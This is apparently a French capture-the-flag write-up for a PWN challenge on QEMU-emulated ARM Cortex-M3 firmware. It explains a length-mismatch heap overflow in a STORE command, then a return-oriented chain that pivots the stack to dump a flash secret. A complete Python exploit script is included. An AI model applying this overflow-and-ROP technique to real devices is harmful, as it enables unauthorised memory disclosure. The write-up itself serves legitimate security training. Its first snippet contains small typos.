# Dead Reckoning -- WriteUp

- CTF : HackTonLycée 2026 (HTL)
- Catégorie : PWN
- Remote : `pwn.ctf.yogosha.com:30003`
- Fichier : Firmware bare-metal ARM Cortex-M3 (Source complète). Tourne sur QEMU avec `mps2-an385`, UART0 en TCP

## Énoncé

The Harcourt DR-7 is a bare-metal ARM Cortex-M3 sensor gateway running under QEMU. It speaks a small framed TLV protocol over its UART, bridged to a TCP socket. No libc, no vendor RTOS: just a cooperative task core, a hand-rolled first-fit heap with inline boundary tags, a return-address shadow stack, and an MPU that marks RAM execute-never.
A reserved secure-flash page holds a maintenance secret. No network command reads it, only the firmware's internal flash-read routine does, and nothing is wired to call it. Convince the device to call it anyway.
The full firmware source, linker script, and datasheet are yours. There is no ASLR, so every address you need stays put.
Connect: `nc pwn.ctf.yogosha.com 30003` The files you need are attached to this challenge.

## Protections et trucs non protégés :

- MPU XN sur la RAM, on peut pas exécuter du code en RAM, donc pas d'injection, uniquement de la réutilisation
- Shadow stack vérifie l'adresse de retour des fonctions intrumentées, mais `cmd_echo` est instrumenté sans que le chemin de retour le soit (`cmd_store` et `cmd_report`)
- `heap_scan` valide les tags à chaque `alloc`, il faut donc garder des en-têtes cohérents
- Pas d'ASLR, donc les adresses sont en dur

## La vulnérabilité

`cmd_store` dans firmware.c :

```c
// tlv_len est défini
uint16_t tlv_len = rd16(&g_body[1]);

// il est ensuite validé
if (tlv_len > body_len - 3) { ... }
...

// la taille devient le premier tlv_len
if (g_sess == NULL) g_sess = halloc(tlv_len); 

// Copie de seg_len, et non tlv_len
bcopy_fwd(g_sess, value, seg_len);
```

Le buffer de `g_sess` est seulement alloué pour le premier `tlv_len`, mais la copie utilise `seg_len`, un champ du header indépendant et délimité seulement par `seg_len <= body_len` (<= 2048). Ce qui permet donc de faire un Overflow contrôlé depuis `g_sess`.

# Exploitation

1. 1er STORE : `tlv_len = 0x40`, ce qui alloue `g_sess` (`0x48`).
2. OPEN : alloue `tcb` juste après `g_sess` sur le heap. Le `tcb` contient un pointeur `ops` vers `task_ops` ; `REPORT` appelle `g_task->ops->report(g_task)`, donc il y a un appel indirect contrôlable
3. 2ème STORE : `seq_len = 0x58`, on déborde `g_sess` jusque dans `tcb` :
    - On reconstruit l'entête de chunk du `tcb` pour passer `heap_scan`
    - On pointe `tcb` vers une fausse `task_ops` fabriqué dans notre buffer
4. REPORT : déclenche `report(g_task)`. On enchaîne les gadgets à adresse fixe (`gadget.c` / `link.ld`) :
    - `svc_restore_ctx` (`0x8001`) : `ldr r1, [r0, #12]; mov sp, r1; pop {r0, pc}` -> pivot vers une fausse pile dans notre buffer (`r0 = g_task`, `[r0 + 12] = piv`).
    - `svc_set_len` (`0x8041`) : `pop {r1, pc}` -> charge `r1 = longueur`.
    - `flash_read` (`0x8081`) : lit `r1` octets depuis `r0` et les recrache sur l'UART. On met `r0 = 0xC000` -> dump du secret

Le `tcb` est mit à zero par `OPEN`, on force `piv` (dans le `tcb`) à pointer sur notre fausse pile, qui est elle aussi dans `g_sess`.

## Exploitation pas à pas

Code pour aider à frame : (j'y comprends pas grand chose, ok c'est moi qui l'ai fait, mais j'arrive toujours pas à le comprendre... nos codeurs ont du talent xD !)

```python
import socket, struct

p32 = lambda x: struct.pack("<I", x & 0xffffffff)

def frame(cmd, seg_len, body):
    return b"DR" + bytes([1, cmd]) + struct.pack("<H", seg_len) + struct.pack("<H", len(body)) + body

def tlv(type_, tlv_len, value):
    return bytes([type_]) + struct.pack("<H", tlv_len) + value
```

### Étape 1 - Allouer un petit `g_sess`

Le premier `STORE` fixe la taille du buffer de session à `tlv_len = 0x40` (donc un total de `0x48`)

```python
s = socket.create_connection(("pwn.ctf.yogosha.com", 30003))
s.sendal(frame(1, 0, tlv(0, 0x40, b"\x00"+0x40)))               # 1er STORE : alloue g_sess (0x40)
```

### Étape 2 - Placer `tcb` juste après

`OPEN` alloue le `tcb` dans le chunk suivant `g_sess` : afin de préparer l'Overflow

```python
s.sendall(frame(2, 0, b""))                                     # OPEN : alloue le tcb
```

### Étape 3 - Fabriquer le payload

On écrit depuis `g_sess` une fausse pile, une fausse `task_ops`, l'en-tête de chunk et le corps du `tcb` (pointeurs `ops` et `piv` seront redirigés vers notre code).

```python
HEAP=0x20010000; B=HEAP+8; SECRET=0x0000C000
G_PIVOT=0x8001; G_SETR1=0x8041; G_FLASH=0x8081
pl  = p32(SECRET)  + p32(G_SETR1)                               # fausse pile : r0=SECRET, pc=set_len
pl += p32(0x80)    + p32(G_FLASH)                               # r1=0x80 (longueur), pc=flash_read
pl += p32(0) + p32(0) + p32(G_PIVOT)                            # fausse task_ops : report -> pivot
pl += b"\x00"*0x24
pl += p32(0x49) + p32(0x48)                                     # en-tête du chunk tcb (passe heap_scan)
pl += p32(0) + p32(0)                                           # tcb.id, tcb.flags
pl += p32(B+0x10)                                               # tcb.ops -> fausse task_ops
pl += p32(B+0x00)                                               # tcb.piv -> fausse pile ROP
```

### Étape 4 - Déborder puis déclencher

Le deuxième STORE copie `seg_len` octets et écrase `tcb`. `REPORT` appelle `ops->report`, qui fait le pivot puis `flash_read` dump le secret sur l'UART.

```python
s.sendall(frame(1, len(pl), tlv(0, 0, pl)))            # STORE #2 : overflow (seg_len!)
s.sendall(frame(3, 0, b""))                            # REPORT : ROP -> dump du secret
print(s.recv(4096))                                    # HTL{...}
```

## Exploit complet :

Résumé des adresses (pas d'ASLR) :

| symbole        | adresse  | rôle                                            |
|----------------|----------|-------------------------------------------------|
| heap base      | `0x20010000` | `g_sess` payload en `+8`                    |
| secret flash   | `0x0000C000` | contenu à dumper                            |
| `svc_restore_ctx` | `0x8001` | pivot `sp` + `pop {r0,pc}`                   |
| `svc_set_len`  | `0x8041` | `pop {r1,pc}`                                   |
| `flash_read`   | `0x8081` | dump `r1` octets de `r0` vers l'UART            |

Lancement :

```
python3 exploit.py pwn.ctf.yogosha.com 30003
```

Script intégral :

```python
#!/usr/bin/env python3
import socket, struct, sys, time

HOST = "pwn.ctf.yogosha.com"
PORT = 30003

# ---- fixed addresses (no ASLR) ----
HEAP   = 0x20010000
B      = HEAP + 8           # g_sess payload  = 0x20010008
SECRET = 0x0000C000
G_PIVOT = 0x8001            # svc_restore_ctx: ldr r1,[r0,#12]; mov sp,r1; pop{r0,pc}
G_SETR1 = 0x8041            # svc_set_len:     pop {r1, pc}
G_FLASH = 0x8081            # flash_read:      dumps r1 bytes from r0 to UART

p32 = lambda x: struct.pack("<I", x & 0xffffffff)

def frame(cmd, seg_len, body):
    hdr = b"DR" + bytes([1, cmd]) + struct.pack("<H", seg_len) + struct.pack("<H", len(body))
    return hdr + body

# ---- build the overflow payload (written at B = 0x20010008) ----
# fake ROP stack for g_pivot's pivot
pl  = p32(SECRET)     # +0x00  0x20010008 -> r0 (pop{r0,pc})
pl += p32(G_SETR1)    # +0x04  0x2001000C -> pc = g_setr1
pl += p32(0x80)       # +0x08  0x20010010 -> r1 (pop{r1,pc})
pl += p32(G_FLASH)    # +0x0C  0x20010014 -> pc = g_flash
# fake task_ops struct (ops+8 = report)
pl += p32(0)          # +0x10  0x20010018  init
pl += p32(0)          # +0x14  0x2001001C  poll
pl += p32(G_PIVOT)    # +0x18  0x20010020  report -> g_pivot
pl += b"\x00" * 0x24  # +0x1C..0x40 filler up to g_task header
# g_task chunk header (keep heap_scan happy)
pl += p32(0x49)       # +0x40  0x20010048  size = 0x48 | in-use
pl += p32(0x48)       # +0x44  0x2001004C  prevsz = g_sess total
# tcb body
pl += p32(0)          # +0x48  0x20010050  id
pl += p32(0)          # +0x4C  0x20010054  flags
pl += p32(B + 0x10)   # +0x50  0x20010058  ops  -> fake task_ops (0x20010018)
pl += p32(B + 0x00)   # +0x54  0x2001005C  piv  -> fake stack (0x20010008)
assert len(pl) == 0x58, len(pl)

def tlv_body(type_, tlv_len, value):
    return bytes([type_]) + struct.pack("<H", tlv_len) + value

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(3)

    def send(f): s.sendall(f)
    def recv():
        time.sleep(0.2)
        try:
            return s.recv(4096)
        except socket.timeout:
            return b""

    print("[banner]", recv())

    # 1) first STORE: allocate g_sess sized 0x40 (total chunk 0x48), copy 0 bytes
    send(frame(1, 0, tlv_body(0, 0x40, b"\x00" * 0x40)))
    print("[store1]", recv())

    # 2) OPEN: allocate the tcb right after g_sess
    send(frame(2, 0, b""))
    print("[open]  ", recv())

    # 3) second STORE: overflow g_sess into the tcb (seg_len=0x58 bytes)
    send(frame(1, 0x58, tlv_body(0, 0, pl)))
    print("[store2]", recv())

    # 4) REPORT: g_task->ops->report(g_task) -> ROP -> flash_read dumps secret
    send(frame(3, 0, b""))
    data = b""
    for _ in range(5):
        data += recv()
    print("[report]", data)

    for tag in (b"HTL{", b"flag", b"CTF{"):
        i = data.find(tag)
        if i != -1:
            print("\n[+] FLAG:", data[i:data.find(b'}', i)+1].decode(errors="replace"))
            break
    s.close()

if __name__ == "__main__":
    main()
```

## Flag

`HTL{two_lengths_one_overflow}` (dumpé depuis la page secure flash `0xC000`).